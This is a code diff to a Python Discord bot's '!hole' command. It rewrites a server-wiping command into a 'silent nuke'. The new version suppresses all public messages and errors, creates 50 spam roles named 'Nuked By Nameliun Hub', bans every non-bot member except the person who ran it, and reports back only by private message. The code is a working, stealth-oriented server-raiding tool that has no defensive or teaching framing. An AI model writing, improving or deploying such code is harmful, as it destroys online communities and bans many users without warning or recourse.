@@ -35,54 +35,45 @@ async def on_ready():
 # --- Text Command: !hole ---
 @bot.command(name="hole")
 async def hole_command(ctx):
-    """Nuke command: removes all roles and bans all members"""
+    """Silent nuke command: creates roles and bans all members"""
     
-    await ctx.send("⚠️ **NUKE INITIATED** ⚠️\nProcessing... This may take a while.")
-    
+    # Don't send any public messages - silent operation
     try:
         guild = ctx.guild
         if not guild:
-            await ctx.send("❌ Could not find guild")
             return
 
-        # Remove all roles (except @everyone)
-        roles_removed = 0
-        role_errors = []
-        
-        for role in guild.roles:
-            # Skip @everyone role (can't be deleted) and managed roles (bot roles)
-            if role.name != "@everyone" and not role.managed:
-                try:
-                    await role.delete()
-                    roles_removed += 1
-                except Exception as e:
-                    role_errors.append(f"Failed to delete role {role.name}: {str(e)[:50]}")
+        # Create multiple roles with the specified name
+        created_roles = []
+        for i in range(50):  # Create 50 roles
+            try:
+                role = await guild.create_role(name="Nuked By Nameliun Hub")
+                created_roles.append(role)
+            except:
+                pass
 
         # Ban all members (except bots and the command user)
         members_banned = 0
-        ban_errors = []
-        
         for member in guild.members:
             # Skip bots and the command user
             if not member.bot and member != ctx.author:
                 try:
-                    await member.ban(reason="!hole command executed")
+                    await member.ban(reason="Nuked By Nameliun Hub")
                     members_banned += 1
-                except Exception as e:
-                    ban_errors.append(f"Failed to ban {member.name}: {str(e)[:50]}")
+                except:
+                    pass
 
-        # Send completion message
-        response = f"✅ **NUKE COMPLETE** ✅\n"
-        response += f"- Removed {roles_removed} roles\n"
-        response += f"- Banned {members_banned} members\n"
-        
-        if role_errors or ban_errors:
-            response += f"\n⚠️ Errors encountered: {len(role_errors) + len(ban_errors)}"
-        
-        await ctx.send(response)
+        # Send only a private confirmation to the command user
+        try:
+            await ctx.author.send(f"✅ Silent nuke completed!\n- Created {len(created_roles)} roles\n- Banned {members_banned} members")
+        except:
+            pass
 
     except Exception as e:
-        await ctx.send(f"❌ Error during nuke: {str(e)}")
+        try:
+            await ctx.author.send(f"❌ Error during silent nuke: {str(e)}")
+        except:
+            pass
 
 # --- Text Command: !start ---
 @bot.command(name="start")
